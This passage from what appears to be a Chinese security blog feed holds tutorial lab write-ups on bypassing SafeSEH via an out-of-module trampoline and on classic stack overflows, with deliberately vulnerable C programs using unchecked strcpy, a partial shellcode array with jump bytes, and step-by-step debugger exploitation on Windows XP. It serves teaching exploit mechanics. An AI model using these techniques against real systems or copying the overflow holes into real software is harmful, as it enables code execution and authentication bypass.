OllyDbg 的“view→memory”查看程序的内存映射状态）。例如下图中的 map类型，如果我们能在这些文件中找到跳转指令的话就可以绕过 SafeSEH，而这样的指令也确实存在。</p><p><img src="/2022/06/09/%E4%BA%A1%E7%BE%8A%E8%A1%A5%E7%89%A2%EF%BC%9ASafeSEH/image-20220609163404514.png" alt="image-20220609163404514"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">跳板指令：</span><br><span class="line">除了前面的 pop eax pop eax retn 外，还有以下指令</span><br><span class="line">call/jmp dword ptr[esp+0x8]</span><br><span class="line">call/jmp dword ptr[esp+0x14]</span><br><span class="line">call/jmp dword ptr[esp+0x1c]</span><br><span class="line">call/jmp dword ptr[esp+0x2c]</span><br><span class="line">call/jmp dword ptr[esp+0x44]</span><br><span class="line">call/jmp dword ptr[esp+0x50]</span><br><span class="line">call/jmp dword ptr[ebp+0xc]</span><br><span class="line">call/jmp dword ptr[ebp+0x24]</span><br><span class="line">call/jmp dword ptr[ebp+0x30]</span><br><span class="line">call/jmp dword ptr[ebp-0x4]</span><br><span class="line">call/jmp dword ptr[ebp-0xc]</span><br><span class="line">call/jmp dword ptr[ebp-0x18]</span><br></pre></td></tr></table></figure><p>只要找到一条指令就能绕过 SafeSEH 了。我们通过下面的程序来演示和分析如何在所有加载模块都开启 SafeSEH 机制的情况下绕过 SafeSEH。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> shellcode[]=</span><br><span class="line"><span class="string">&quot;\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C&quot;</span></span><br><span class="line"><span class="string">&quot;……&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\xE9\x2B\xFF\xFF\xFF\x90\x90\x90&quot;</span><span class="comment">// far jump and \x90</span></span><br><span class="line"><span class="string">&quot;\xEB\xF6\x90\x90&quot;</span><span class="comment">// short jump and \x90</span></span><br><span class="line"><span class="string">&quot;\x0B\x0B\x29\x00&quot;</span><span class="comment">// address of call [ebp+30] in outside memory</span></span><br><span class="line">;</span><br><span class="line">DWORD <span class="title function_">MyException</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;There is an exception&quot;</span>);</span><br><span class="line">    getchar();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">test</span><span class="params">(<span class="type">char</span> * input)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> str[<span class="number">200</span>];</span><br><span class="line">    <span class="built_in">strcpy</span>(str,input);</span><br><span class="line">    <span class="type">int</span> zero=<span class="number">0</span>;</span><br><span class="line">    __try</span><br><span class="line">    &#123;</span><br><span class="line">    zero=<span class="number">1</span>/zero;</span><br><span class="line">    &#125;</span><br><span class="line">    __except(MyException())</span><br><span class="line">    &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> _tmain(<span class="type">int</span> argc, _TCHAR* argv[])</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//__asm int 3</span></span><br><span class="line">    test(shellcode);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实验思路：<br>（ 1） Test 函数中通过向 str 复制超长字符串造成 str 溢出，进而覆盖程序的 S.E.H 信息。<br>（ 2）该程序中所有加载模块都启用了 SafeSEH 机制，故我们不能通过未启用 SafeSEH 的模块还绕过 SafeSEH 了。<br>（ 3）将异常处理函数指针覆盖为加载模块外的地址来实现对 SafeSEH 的绕过，然后通过除 0 触发异常将程序转入异常处理，进而劫持程序流程。</p><table><thead><tr><th></th><th>推荐使用的环境</th><th>备 注</th></tr></thead><tbody><tr><td>操作系统</td><td>Window XP SP3</td><td>DEP 关闭</td></tr><tr><td>编译器</td><td>Visual Studio 2008</td><td></td></tr><tr><td>编译选项</td><td>禁用优化选项</td><td></td></tr><tr><td>build 版本</td><td>release 版本</td><td></td></tr></tbody></table><blockquote><p>说明： shellcode 中尾部的 0x00290B0B 为 Windows XP SP3 下的跳板地址，如果您在其他操作系统下测试，该地址可能需要重新设置。</p></blockquote><p>实验步骤：</p><p>（ 1）分析程序，先将 shellcode 填充为多个 0x90（长度不超过200个），然后编译运行程序。<br>在 Ollydbg 中用 OllySEH 插件分析加载模块的 SafeSEH 情况，如下图，可以看到，所有加载模块都没有 /SafeSEH OFF 状态。</p><p><img src="/2022/06/09/%E4%BA%A1%E7%BE%8A%E8%A1%A5%E7%89%A2%EF%BC%9ASafeSEH/image-20220609170143708.png" alt="image-20220609170143708"></p><p>（ 2）在加载模块内存之外<strong>寻找合适的跳板</strong>绕过 SafeSEH。</p><ol><li>接下来需要使用 OllyFindAddr 插件，它能在整个程序的内存空间搜索指令。OllyFindAddr下载地址：<a href="https://bbs.pediy.com/thread-198080.htm">https://bbs.pediy.com/thread-198080.htm</a></li><li>使用 call/jmp dword ptr[ebp+n]指令作为跳板。插件 —&gt; OllyFindAddr —&gt; Overflow return address —&gt; Find CALL/JMP [EBP+N]</li></ol><p><img src="/2022/06/09/%E4%BA%A1%E7%BE%8A%E8%A1%A5%E7%89%A2%EF%BC%9ASafeSEH/image-20220609170723023.png" alt="image-20220609170723023"></p><ol start="3"><li>在日志中查看搜索结果。Module：Unknown，就是加载模块之外的指令，将 0x00280B0B 作为跳板。</li></ol><blockquote><p>如果不确定，也可以将它与加载模块逐一比对。</p></blockquote><p><img src="/2022/06/09/%E4%BA%A1%E7%BE%8A%E8%A1%A5%E7%89%A2%EF%BC%9ASafeSEH/image-20220609171116159.png" alt="image-20220609171116159"></p><p>（ 3）消除异常。如果直接用 0x00280B0B 构造 shellcode，那shellcode 可能会被它中的0x00截断，所以我们要将跳板放在shellcode的最后，防止其造成异常。</p><p>通过前面利用未启用 SafeSEH 模块绕过 SafeSEH，我们知道通过跳板指令转入 shellcode 后首先是4个字节的 0x90 的填充，所以我们可以利用这4个字节来跳转到 shellcode，而前面提到的 0xEB0E9090，其实 0xEB0E 是向前跳转 0x0E 的机器码，可以把它放在这4字节中，但由于1个字节的操作数向前回跳的范围有限，不足以跳转到shellcode 的起始地址，所以我们用两次跳转来完成跳跃。</p><p><strong>部署两个跳板</strong>，在刚刚的 4个字节中部署短跳转指令 0xEBF6 向前回跳 8个字节。（JMP 指令用相对地址跳转时，是以 JMP 下一条指令的地址为基准，所以实际上是向后跳转10个字节）在这 8个字节中再布置一条 5字节的长跳转指令，跳转到 shellcode 的起始部分。</p><p><img src="/2022/06/09/%E4%BA%A1%E7%BE%8A%E8%A1%A5%E7%89%A2%EF%BC%9ASafeSEH/image-20220609174416604.png" alt="image-20220609174416604"></p><p>（ 4）构造 shellcode</p><ol><li>确定 shellcode 起始地址到长跳转指令之间的距离。</li></ol><p>本实验中，被溢出字符串起始位置为 0x0012FE88，距离最近 SEH地址为 0x0012FF60，部署长跳转指令位于 0x0012FF58，所以我们需要回跳 213 个字节（包含长跳转指令的 5 个字节），使用 E92BFFFFFF（跳转 0xFFFFFF2B 个字节）填充长跳位置。</p><p><img src="/2022/06/09/%E4%BA%A1%E7%BE%8A%E8%A1%A5%E7%89%A2%EF%BC%9ASafeSEH/image-20220609175749949.png" alt="image-20220609175749949"></p><p>除 0 异常后，最近SEH 地址为0x0012FF60</p><p><img src="/2022/06/09/%E4%BA%A1%E7%BE%8A%E8%A1%A5%E7%89%A2%EF%BC%9ASafeSEH/image-20220609180802012.png" alt="image-20220609180802012"></p><p><img src="/2022/06/09/%E4%BA%A1%E7%BE%8A%E8%A1%A5%E7%89%A2%EF%BC%9ASafeSEH/image-20220609182557595.png" alt="image-20220609182557595"></p><ol start="2"><li>部署 shellcode</li></ol><p><img src="/2022/06/09/%E4%BA%A1%E7%BE%8A%E8%A1%A5%E7%89%A2%EF%BC%9ASafeSEH/image-20220609183731968.png" alt="image-20220609183731968"></p><p>（ 5）运行验证，对话框弹出</p><p><img src="/2022/06/09/%E4%BA%A1%E7%BE%8A%E8%A1%A5%E7%89%A2%EF%BC%9ASafeSEH/image-20220609184806753.png" alt="image-20220609184806753"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;safeseh-对异常处理的保护原理&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#safeseh-对异常处理的保护原理&quot;&gt;&lt;/a&gt; SafeSEH 对异常处理的保护原理&lt;/h1&gt;
&lt;h2 id=&quot;safese</summary>
      
    
    
    
    <category term="0day安全" scheme="https://www.rgzzplus.com/categories/0day%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="SafeSEH" scheme="https://www.rgzzplus.com/tags/SafeSEH/"/>
    
  </entry>
  
  <entry>
    <title>栈溢出</title>
    <link href="https://www.rgzzplus.com/2022/06/05/%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
    <id>https://www.rgzzplus.com/2022/06/05/%E6%A0%88%E6%BA%A2%E5%87%BA/</id>
    <published>2022-06-05T08:49:28.000Z</published>
    <updated>2022-08-01T11:17:09.430Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><h1 id="基础知识"><a class="markdownIt-Anchor" href="#基础知识"></a> 基础知识</h1><h2 id="二进制文件概述"><a class="markdownIt-Anchor" href="#二进制文件概述"></a> 二进制文件概述</h2><h3 id="pe文件格式"><a class="markdownIt-Anchor" href="#pe文件格式"></a> PE文件格式</h3><p>PE（Portable Executable）是 Win32 平台下的可执行文件（如：&quot;*.exe&quot;,&quot;*.dll&quot;)，PE文件规定了所有信息（二进制机器代码、字符串、菜单、图标、位图、字体等）在可执行文件中如何组织。</p><p>PE 文件格式把可执行文件分成若干个数据节（section）：</p><ul><li>.text    二进制的机器代码</li><li>.data    初始化的数据块</li><li>.idata    动态链接库</li><li>.rsrc    程序的资源</li></ul><h1 id="系统栈的工作原理"><a class="markdownIt-Anchor" href="#系统栈的工作原理"></a> 系统栈的工作原理</h1><h2 id="内存的不同用途"><a class="markdownIt-Anchor" href="#内存的不同用途"></a> 内存的不同用途</h2><p>缓冲区溢出：大缓冲区向小缓冲区复制，撑爆了小缓冲区，从而冲掉了和小缓冲区相邻内存区域的其它数据而引起的内存问题。</p><p>进程使用的内存划分：</p><ol><li>代码区</li><li>数据区</li><li>堆区</li><li>栈区</li></ol><p><img src="/2022/06/05/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20220519164948399.png" alt="image-20220519164948399"></p><h2 id="函数调用过程"><a class="markdownIt-Anchor" href="#函数调用过程"></a> 函数调用过程</h2><p>同一文件不同函数的代码在内存代码区中是散乱无关的，但都在同一个 PE 文件的代码所映射的一个 “节” 里。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">intfunc_B(<span class="type">int</span> arg_B1, <span class="type">int</span> arg_B2)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> var_B1, var_B2;</span><br><span class="line">    var_B1=arg_B1+arg_B2;</span><br><span class="line">    var_B2=arg_B1-arg_B2;</span><br><span class="line">    <span class="keyword">return</span> var_B1*var_B2;</span><br><span class="line">&#125;</span><br><span class="line">intfunc_A(<span class="type">int</span> arg_A1, <span class="type">int</span> arg_A2)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> var_A;</span><br><span class="line">    var_A = func_B(arg_A1,arg_A2) + arg_A1;</span><br><span class="line">    <span class="keyword">return</span> var_A;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv, <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> var_main;</span><br><span class="line">    var_main=func_A(<span class="number">4</span>,<span class="number">3</span>);</span><br><span class="line">    <span class="keyword">return</span> var_main;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当函数被调用时，系统栈会为这个函数开辟一个新的栈帧，并把它压入栈中。这个栈帧的内存空间被它所属的函数独占。当函数返回时，系统栈会弹出该函数所对应的栈帧。</p><p><img src="/2022/06/05/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20220221193711651.png" alt="image-20220221193711651"></p><p>函数调用时，栈中的变化：</p><p><img src="/2022/06/05/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20220519170737556.png" alt="image-20220519170737556"></p><h2 id="函数调用相关约定"><a class="markdownIt-Anchor" href="#函数调用相关约定"></a> 函数调用相关约定</h2><p><img src="/2022/06/05/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20220519171050801.png" alt="image-20220519171050801"></p><p>如果要明确使用某一种调用约定，在函数前加上调用约定的声名即可。默认调用是__stdcall 调用方式，从右向左将参数入栈。</p><blockquote><p>特例：C++类成员中的 this 指针，一般用 ECX 寄存器传递。用GCC编译器编译，他会作为最后一个参数压栈。</p></blockquote><p><strong>函数调用步骤：</strong></p><ol><li>参数入栈</li><li>返回地址入栈</li><li>代码区跳转</li><li>栈帧调整：<br>保存当前栈帧状态值，已备后面恢复本栈帧时使用（ EBP 入栈）；<br>将当前栈帧切换到新栈帧（将 ESP 值装入 EBP，更新栈帧底部）；<br>给新栈帧分配空间（把 ESP 减去所需空间的大小，抬高栈顶）；</li></ol><p>__stdcall 调用约定，函数调用指令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">;调用前</span><br><span class="line">push 参数 3 ;假设该函数有 3 个参数，将从右向左依次入栈</span><br><span class="line">push 参数 2</span><br><span class="line">push 参数 1</span><br><span class="line">call 函数地址;call 指令将同时完成两项工作： </span><br><span class="line">;a）向栈中压入当前指令在内存中的位置，即保存返回地址。 </span><br><span class="line">;b）跳转到所调用函数的入口地址函数入口处</span><br><span class="line">push ebp ;保存旧栈帧的底部</span><br><span class="line">mov ebp, esp ;设置新栈帧的底部（栈帧切换）</span><br><span class="line">sub esp, xxx ;设置新栈帧的顶部（抬高栈顶，为新栈帧开辟空间）</span><br></pre></td></tr></table></figure><p><strong>函数返回的步骤：</strong></p><ol><li><p>保存返回值：通常保存在 EAX 中。</p></li><li><p>弹出当前栈帧，恢复上一个栈帧。<br>具体操作：</p><ol><li>在堆栈平衡的基础上，给 ESP 加上栈帧的大小，降低栈顶，回收当前栈帧的空间</li><li>将当前栈帧底部保存的前栈帧 EBP 值弹入 EBP 寄存器，恢复出上一个栈帧。</li><li>将函数返回地址弹给 EIP 寄存器。</li></ol><p><img src="/2022/06/05/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20220519172202601.png" alt="image-20220519172202601"></p></li><li><p>跳转</p></li></ol><p>函数返回时，相关指令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">add esp, xxx ;降低栈顶，回收当前的栈帧</span><br><span class="line">pop ebp;将上一个栈帧底部位置恢复到 ebp，</span><br><span class="line">retn;这条指令有两个功能： </span><br><span class="line">;a)弹出当前栈顶元素，即弹出栈帧中的返回地址。</span><br><span class="line">;至此，栈帧恢复工作完成。 </span><br><span class="line">;b)让处理器跳转到弹出的返回地址，恢复调用前的代码区</span><br></pre></td></tr></table></figure><p><img src="/2022/06/05/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20220221170612199.png" alt="image-20220221170612199"></p><h1 id="修改邻接变量"><a class="markdownIt-Anchor" href="#修改邻接变量"></a> 修改邻接变量</h1><h2 id="修改邻接变量原理"><a class="markdownIt-Anchor" href="#修改邻接变量原理"></a> 修改邻接变量原理</h2><p>函数的局部变量在栈中相邻排列。如果局部变量有数组之类的缓冲区，并且程序中存在数组越界缺陷，那么越界的数组就能破坏相邻变量，甚至能破坏 EBP 、返回地址。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PASSWORD <span class="string">&quot;1234567&quot;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">verify_password</span> <span class="params">(<span class="type">char</span> *password)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> authenticated;</span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">8</span>];<span class="comment">// add local buffto be overflowed</span></span><br><span class="line">    authenticated=<span class="built_in">strcmp</span>(password,PASSWORD);</span><br><span class="line">    <span class="built_in">strcpy</span>(buffer,password);<span class="comment">//over flowed here!</span></span><br><span class="line">    <span class="keyword">return</span> authenticated;</span><br><span class="line">&#125;</span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> valid_flag=<span class="number">0</span>;</span><br><span class="line">    <span class="type">char</span> password[<span class="number">1024</span>];</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;please input password: &quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,password);</span><br><span class="line">        valid_flag = verify_password(password);</span><br><span class="line">        <span class="keyword">if</span>(valid_flag)</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;incorrect password!\n\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Congratulation! You have passed the</span></span><br><span class="line"><span class="string">            verification!\n&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当程序执行到 int verify_password(char *password)时，栈帧状态如下图：</p><p><img src="/2022/06/05/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20220221170630782.png" alt="image-20220221170630782"></p><p><strong>改变程序流程思路：</strong></p><p>可以发现，authenticated 变量来源于 strcmp 函数的返回值，它被返回给main函数作为验证标志。当 authenticated 为 0 时，标识验证成功；反之，验证不成功。</p><p>当我们输入超过 7 个字符的密码（注意：字符截断符 NULL 将占用一个字节），就有机会把 authenticated 覆盖为 0，从而绕过密码验证。</p><h3 id="突破密码验证程序"><a class="markdownIt-Anchor" href="#突破密码验证程序"></a> 突破密码验证程序</h3><table><thead><tr><th></th><th>推荐使用的环境</th><th>备 注</th></tr></thead><tbody><tr><td>操作系统</td><td>Windows XP SP3</td><td>其他 Win32 操作系统也可进行本实验</td></tr><tr><td>编译器</td><td>Visual C++ 6.0</td><td>如使用其他编译器，需重新调试</td></tr><tr><td>编译选项</td><td>默认编译选项</td><td>VS2003 和 VS2005 中的 GS 编译选项会使栈溢出实验失败</td></tr><tr><td>build 版本</td><td>debug 版本</td><td>如使用 release 版本，则需要重新调试</td></tr></tbody></table><blockquote><p>说明： 如果完全采用实验指导所推荐的实验环境，将精确地重现指导中所有的细节；否则需要根据具体情况重新调试。</p></blockquote><p>（1）先验证一下正确密码，输入“1234567”，通过验证，结果如下图所示：</p><p><img src="/2022/06/05/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20220519210442088.png" alt="image-20220519210442088"></p><p>（2）再来分析一下具体覆盖时，栈中的情况，输入“qqqqqqq”，因为“qqqqqqq”&gt;“1234567”，所以 strcmp 应该返回 1，即 authenticated 为 1。</p><p><img src="/2022/06/05/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20220519213526513.png" alt="image-20220519213526513"></p><table><thead><tr><th>局部变量名</th><th>内存地址</th><th>偏移 3 处的值</th><th>偏移 2 处的值</th><th>偏移 1 处的值</th><th>偏移 0 处的值</th></tr></thead><tbody><tr><td>buffer[0～3]</td><td>0x0012FB18</td><td>0x71 (‘q’)</td><td>0x71 (‘q’)</td><td>0x71 (‘q’)</td><td>0x71 (‘q’)</td></tr><tr><td>buffer[4～7]</td><td>0x0012FB1C</td><td>NULL</td><td>0x71 (‘q’)</td><td>0x71 (‘q’)</td><td>0x71 (‘q’)</td></tr><tr><td>authenticated</td><td>0x0012FB20</td><td>0x00</td><td>0x00</td><td>0x00</td><td>0x01</td></tr></tbody></table><blockquote><p>观察内存时，注意 “内存数据” 与 “数值数据” 的区别。Win32 系统在内存中由低位向高位存储一个 4 字节的双字（DWORD），但在作为 ”数值“ 应用的时候，却是按照由高位字节向低位字节进行解释。“内存数据” 中的 DWORD 和我们逻辑上使用的 “数值数据” 是按字节序逆序过的。</p></blockquote><p>（3）输入超过 7 个字符，“qqqqqqqqrst”，结果如下图：</p><p><img src="/2022/06/05/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20220519214229348.png" alt="image-20220519214229348"></p><table><thead><tr><th>局部变量名</th><th>内存地址</th><th>偏移 3 处的值</th><th>偏移 2 处的值</th><th>偏移 1 处的值</th><th>偏移 0 处的值</th></tr></thead><tbody><tr><td>buffer</td><td>0x0012FB18</td><td>0x71 (‘q’)</td><td>0x71 (‘q’)</td><td>0x71 (‘q’)</td><td>0x71 (‘q’)</td></tr><tr><td></td><td>0x0012FB1C</td><td>0x71 (‘q’)</td><td>0x71 (‘q’)</td><td>0x71 (‘q’)</td><td>0x71 (‘q’)</td></tr><tr><td>authenticated 被覆盖前</td><td>0x0012FB20</td><td>0x00</td><td>0x00</td><td>0x00</td><td>0x01</td></tr><tr><td>authenticated 被覆盖后</td><td>0x0012FB20</td><td>NULL</td><td>0x74 (‘t’)</td><td>0x73 (‘s’)</td><td>0x72(‘r’)</td></tr></tbody></table><p>我们已经知道，通过溢出 buffer 我们能修改 authenticated 的值，若要改变程序流程，就需要把 authenticated 覆盖为 0，而我们的字符截断符 NULL，就刚好能实现，当我们输入 8 个 ‘q’ 时，buffer所拥有的 8 个字节将全部被 ’q‘ 填充，而 NULL 则刚好写入内存 0x0012FB20 出，即下一个双字的低位字节，恰好能把 authenticated 从 0x 00 00 00 01 改成 0x 00 00 00 00，如下图所示：</p><p><img src="/2022/06/05/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20220519215420951.png" alt="image-20220519215420951"></p><table><thead><tr><th>局部变量名</th><th>内存地址</th><th>偏移 3 处的值</th><th>偏移 2 处的值</th><th>偏移 1 处的值</th><th>偏移 0 处的值</th></tr></thead><tbody><tr><td>buffer</td><td>0x0012FB18</td><td>0x71 (‘q’)</td><td>0x71 (‘q’)</td><td>0x71 (‘q’)</td><td>0x71 (‘q’)</td></tr><tr><td></td><td>0x0012FB1C</td><td>0x71 (‘q’)</td><td>0x71 (‘q’)</td><td>0x71 (‘q’)</td><td>0x71 (‘q’)</td></tr><tr><td>authenticated 被覆盖前</td><td>0x0012FB20</td><td></td><td></td><td></td><td>0x01</td></tr><tr><td>authenticated 被覆盖后</td><td>0x0012FB20</td><td></td><td></td><td></td><td>0x00 (NULL)</td></tr></tbody></table><p>经上述分析，我们只要输入 8 个**（大于 ”1234567“）** 字符的字符串，那么最后的 NULL 就能将 authenticated 低字节中的 1 覆盖为 0，从而绕过验证程序。</p><blockquote><p>authenticated = strcmp( password, PASSWORD )，<br>当输入的字符串大于 ”1234567“时，返回1（0x 00 00 00 01），这时可以用NULL 淹没 authenticated 的低位字节从而突破验证；<br>当输入的字符串小于 ”1234567“时，返回 -1（0x FF FF FF FF），这时如果任然用上述方法淹没，其值变为 0xFF FF FF 00，所以这时是不能冲破验证程序的。</p></blockquote><h1 id="修改函数返回地址"><a class="markdownIt-Anchor" href="#修改函数返回地址"></a> 修改函数返回地址</h1><h2 id="返回地址与程序流程"><a class="markdownIt-Anchor" href="#返回地址与程序流程"></a> 返回地址与程序流程</h2><p>更改邻接变量对环境要求很苛刻。而更改 EBP 和函数返回地址，往往更通用，更强大。</p><p>上节实验输入 7 个 “q“ ，程序栈状态：</p><table><thead><tr><th>局部变量名</th><th>内存地址</th><th>偏移 3 处的值</th><th>偏移 2 处的值</th><th>偏移 1 处的值</th><th>偏移 0 处的值</th></tr></thead><tbody><tr><td>buffer</td><td>0x0012FB18</td><td>0x71 (‘q’)</td><td>0x71 (‘q’)</td><td>0x71 (‘q’)</td><td>0x71 (‘q’)</td></tr><tr><td></td><td>0x0012FB1C</td><td>NULL</td><td>0x71 (‘q’)</td><td>0x71 (‘q’)</td><td>0x71 (‘q’)</td></tr><tr><td>authenticated</td><td>0x0012FB20</td><td>0x00</td><td>0x00</td><td>0x00</td><td>0x01</td></tr><tr><td>前栈帧 EBP</td><td>0x0012FB24</td><td>0x00</td><td>0x12</td><td>0xFF</td><td>0x80</td></tr><tr><td>返回地址</td><td>0x0012FB28</td><td>0x00</td><td>0x40</td><td>0x10</td><td>0xEB</td></tr></tbody></table><p>如果继续增加输入的字符，我们就能让字符串中相应位置字符的 ASCII 码覆盖掉这些栈帧状态值。</p><p>这里用 19 个字符作为输入，看看淹没返回地址会对程序产生什么影响。出于双字对齐的目的，我们输入的字符串按照 “ 4321 ” 为一个单元进行组织，最后输入的字符串为“ 4321432143214321432”。</p><p><img src="/2022/06/05/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20220519232154440.png" alt="image-20220519232154440"></p><table><thead><tr><th>局部变量名</th><th>内存地址</th><th>偏移 3 处的值</th><th>偏移 2 字节</th><th>偏移 1 字节</th><th>偏移 0 字节</th></tr></thead><tbody><tr><td>buffer[0~3]</td><td>0x0012FB18</td><td>0x31 (‘1’)</td><td>0x32 (‘2’)</td><td>0x33 (‘3’)</td><td>0x34 (‘4’)</td></tr><tr><td>buffer[4~7]</td><td>0x0012FBIC</td><td>0x31 (‘1’)</td><td>0x32 (‘2’)</td><td>0x33 (‘3’)</td><td>0x34 (‘4’)</td></tr><tr><td>authenticated（被覆盖前）</td><td>0x0012FB20</td><td>0x00</td><td>0x00</td><td>0x00</td><td>0x01</td></tr><tr><td>authenticated（被覆盖后）</td><td>0x0012FB20</td><td>0x31 (‘1’)</td><td>0x32 (‘2’)</td><td>0x33 (‘3’)</td><td>0x34 (‘4’)</td></tr><tr><td>前栈帧 EBP（被覆盖前）</td><td>0x0012FB24</td><td>0x00</td><td>0x12</td><td>0xFF</td><td>0x80</td></tr><tr><td>前栈帧 EBP（被覆盖后）</td><td>0x0012FB24</td><td>0x31 (‘1’)</td><td>0x32 (‘2’)</td><td>0x33 (‘3’)</td><td>0x34 (‘4’)</td></tr><tr><td>返回地址（被覆盖前）</td><td>0x0012FB28</td><td>0x00</td><td>0x40</td><td>0x10</td><td>0xEB</td></tr><tr><td>返回地址（被覆盖后）</td><td>0x0012FB28</td><td>0x00(NULL)</td><td>0x32 